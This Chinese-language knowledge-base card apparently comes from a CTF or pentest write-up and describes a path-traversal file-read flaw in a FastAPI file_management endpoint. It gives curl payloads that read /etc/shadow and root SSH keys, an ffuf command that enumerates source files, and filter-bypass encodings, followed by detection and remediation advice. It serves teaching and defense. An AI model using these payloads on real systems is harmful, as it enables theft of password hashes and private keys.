---
id: web-generic-file-inclusion-fastapi-file-management-traversal
title: FastAPI file_management 的 file 参数路径穿越：以 root 读取 /etc/shadow 与任意文件
type: scenario
domain: web
path: web/generic/file-inclusion
technique: file-management-path-traversal
tags:
- path-traversal
- arbitrary-file-read
- fastapi
- uvicorn
- python
- etc-shadow
- file-inclusion
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V65
  verified_at: '2026-11-05T12:03:03+08:00'
  notes: 已对照全文核对：robots.txt 泄露 /file_management/?file=implant；file=../../../etc/passwd 与 ../../../etc/shadow 均 200 返回内容，证明服务以 root 读文件；../../../root/root.txt 为 500 而 ../../../root/user.txt 返回 user flag；末尾 ffuf file=../FUZZ -e .py -fc 500 命中 server.py。卡内步骤/PoC 与原文一致。未验证点：读 /root/.ssh/id_rsa 为扩展建议、原文未演示；后端具体拼接代码未给出，卡内用“通常是”表述；PoC 未在本机执行。frontmatter 无 sources/source_url（全库惯例）。
url: /docs/web/generic/file-inclusion/web-generic-file-inclusion-fastapi-file-management-traversal/
draft: false
kb_aliases:
- file_management 任意文件读取
- file 参数路径穿越
- FastAPI 任意文件读取
- uvicorn 文件读取
- 读 /etc/shadow
- 文件读取当源码爆破 oracle
---

## 一句话结论

一个 FastAPI/uvicorn 应用把 `GET /file_management/?file=<name>` 的 `file` 参数直接拼进文件路径且未做规范化，攻击者用 `../../../etc/passwd` 即可读取任意文件；若服务以 root 运行，还能读 `/etc/shadow`、root 家目录文件，并可用该端点做“文件存在性 oracle”爆破后端源码路径。

## 原理

- 该端点本意是按文件名返回 `files/` 目录下的资源，但实现通常是 `open(os.path.join(base_dir, file))` 或 `open(base_dir + "/" + file)`，没有 `os.path.realpath`/`Path.resolve()` 校验，也没有拒绝 `..`。
- `../` 在文件系统层面会逐级上跳，最终可到达 `/etc/passwd`、`/etc/shadow`、`/root/...` 等任意路径；由于没有后缀白名单，读取不受扩展名限制。
- 服务的运行用户决定可读范围：若 uvicorn 以 root 启动，`/etc/shadow`、`/root/.ssh/` 等 root-only 文件都可读；这也解释了为什么能直接读到 root 家目录下的 flag。
- 该端点还可作为盲文件存在性 oracle：对 `file=../FUZZ` 做 fuzz，状态码 200/非 500 表示文件存在；配合 `-e .py` 可以定位 `server.py` 等后端源码，进而白盒审计出更多漏洞。
- 与“文件包含”不同，这里不需要执行/解析文件，只是原样读取字节；危害取决于可读文件中的秘密（口令哈希、私钥、配置文件、源码）。

## 触发条件

- Web 应用暴露类似 `?file=` / `?path=` / `?download=` 的文件读取参数，且未做路径规范化或白名单。
- 参数值可包含 `../`（或可绕过过滤的编码形式），且服务进程对目标文件有读权限。
- 目标文件路径可猜/可枚举（`/etc/passwd`、应用源码、配置、`~/.ssh`、云元数据等）。
- 服务以高权限运行（root）时，可读文件范围与危害显著扩大。

## 利用步骤

1. 确认参数可控：请求 `GET /file_management/?file=implant` 返回文件内容。
2. 用相对路径测试穿越：
   ```bash
   curl 'http://target/file_management/?file=../../../etc/passwd'
   ```
3. 读取高价值文件，确认权限边界：
   ```bash
   curl 'http://target/file_management/?file=../../../etc/shadow'
   curl 'http://target/file_management/?file=../../../root/.ssh/id_rsa'
   ```
4. 若不知道源码/配置路径，用 fuzz 做文件存在性探测：
   ```bash
   ffuf -u 'http://target/file_management?file=../FUZZ' \
     -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
     -e .py -fc 500
   ```
   命中 `server.py` 后直接读取源码，审计其他端点与凭据。
5. 用读到的凭据/私钥/源码继续横向或提权。

## PoC

```bash
# 任意文件读取
curl 'http://target/file_management/?file=../../../etc/passwd'
curl 'http://target/file_management/?file=../../../etc/shadow'

# 用文件存在性 oracle 找后端源码（500 表示不存在/不可读）
ffuf -u 'http://target/file_management?file=../FUZZ' \
  -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt \
  -e .py -fc 500
```

```text
# 典型响应（节选）
root:x:0:0:root:/root:/bin/bash
...
```

## 变体与关联

- 变体：绝对路径 `file=/etc/passwd`；URL 编码 `%2e%2e%2f`、双重编码 `%252e%252e%252f`；多余斜杠/反斜杠；Windows 目标用 `..\..\`。
- 变体：把读取到的源码用于发现硬编码凭据、其他文件读取/上传端点、SQLite 数据库路径等。
- 变体：若服务以 root 运行且可读 `/root/.ssh/`，可直接获取 root 私钥或 `authorized_keys` 内容。
- 关联：[[web-generic-file-upload-multipart-filename-traversal-ssh-key]]（同一应用的写入侧路径穿越）、[[pentest-c2-implant-mitm-task-injection]]（用该读取端点作为 C2 任务的下载源）。
- 边界：服务做了 `realpath` + 前缀校验、以低权限用户运行、目标文件不存在/不可读、或 WAF 拦截 `../` 时，读取失败。

## 检测与防御

- 检测：请求参数中出现 `../`、`%2e%2e`、绝对路径、`/etc/passwd` 等特征；同一来源对 `file=` 参数高频 fuzz（大量 500/200 差异）；非预期读取 `/etc/shadow`、`.ssh`、源码文件。
- 修复：对用户输入做 `os.path.realpath`/`Path.resolve()` 后校验必须位于允许目录内；只允许 basename 或文件名白名单；拒绝 `..`、绝对路径与可疑编码。
- 加固：服务以最小权限用户运行，禁用 root 启动；敏感文件（shadow、私钥）收紧权限；把上传/读取目录与代码目录隔离；对文件读取端点加鉴权与审计。
